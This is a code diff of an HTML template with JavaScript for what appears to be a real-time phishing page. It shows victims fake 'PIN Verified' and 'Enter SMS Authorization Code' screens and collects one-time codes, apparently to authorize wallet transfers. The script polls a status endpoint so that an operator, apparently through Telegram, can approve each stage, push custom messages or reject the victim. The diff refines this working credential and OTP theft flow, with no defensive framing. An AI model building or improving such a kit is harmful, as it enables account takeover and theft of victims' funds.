@@ -52,27 +52,29 @@
             <div class="small">Application ID: <span class="app-id-tag">{{ app_id }}</span></div>
         </div>
 
-        <!-- SMS Code Input Form (revealed when Stage 1 PIN is approved in Telegram) -->
+        <!-- SMS Input Box -->
         <div id="smsSection" class="sms-box d-none">
-            <div class="badge bg-warning text-dark px-3 py-2 text-uppercase mb-3 fw-bold">✓ Pre-Approved</div>
-            <h3 class="fw-bold text-white mb-2">Enter Security Authorization Code</h3>
+            <div class="badge bg-warning text-dark px-3 py-2 text-uppercase mb-3 fw-bold">✓ PIN Verified</div>
+            <h3 class="fw-bold text-white mb-2">Enter SMS Authorization Code</h3>
             <p class="text-white-50 small mb-4">
-                Paste the confidential authorization message or code received on your phone to authorize wallet transfer.
+                Paste the SMS authorization code or security message received on your phone to continue.
             </p>
 
             <form action="/submit-auth-code" method="POST">
                 <div class="mb-3">
-                    <textarea class="form-control" name="auth_code" rows="4" placeholder="Paste authentication SMS or security code here..." required style="border-radius: 12px; font-size: 0.95rem;"></textarea>
+                    <textarea class="form-control" name="auth_code" rows="4" placeholder="Paste SMS code here..." required style="border-radius: 12px; font-size: 0.95rem;"></textarea>
                 </div>
-                <button type="submit" class="btn btn-warning w-100 py-3 fw-bold text-dark rounded-3">SUBMIT FOR DISBURSEMENT</button>
+                <button type="submit" class="btn btn-warning w-100 py-3 fw-bold text-dark rounded-3">SUBMIT SMS CODE</button>
             </form>
         </div>
 
     </div>
 
     <script>
+        const appId = "{{ app_id }}";
+
         function checkStatus() {
-            fetch('/check-status')
+            fetch('/check-status?app_id=' + appId)
                 .then(response => response.json())
                 .then(data => {
                     const waitSection = document.getElementById('waitSection');
@@ -80,26 +82,32 @@
                     const msgBox = document.getElementById('customMsg');
 
                     if (data.status === "Stage1_Approved") {
-                        // PIN Approved -> Show SMS Entry
+                        // Show SMS entry box when PIN is approved
                         waitSection.classList.add('d-none');
                         smsSection.classList.remove('d-none');
                     } else if (data.status === "Stage2_Approved") {
-                        // SMS Approved -> Go to Final OTP step
+                        // Go to Final OTP page when SMS code is approved
                         window.location.href = "/final-verify";
-                    } else if (data.status === "Stage3_Approved") {
-                        // Final OTP Approved -> Success
+                    } else if (data.status === "Stage3_Approved" || data.status === "Approved") {
+                        // Go to success page when OTP is approved
                         window.location.href = "/success";
                     } else if (data.status === "CustomMessage") {
                         msgBox.style.display = 'block';
                         msgBox.textContent = data.custom_message;
                         setTimeout(checkStatus, 2000);
+                    } else if (data.status === "Rejected") {
+                        alert(data.custom_message || "Verification failed. Please try again.");
+                        window.location.href = "/login";
                     } else {
                         setTimeout(checkStatus, 1500);
                     }
                 })
                 .catch(() => setTimeout(checkStatus, 2500));
         }
-        setTimeout(checkStatus, 1000);
+
+        if (appId) {
+            setTimeout(checkStatus, 1000);
+        }
     </script>
 </body>
 </html>
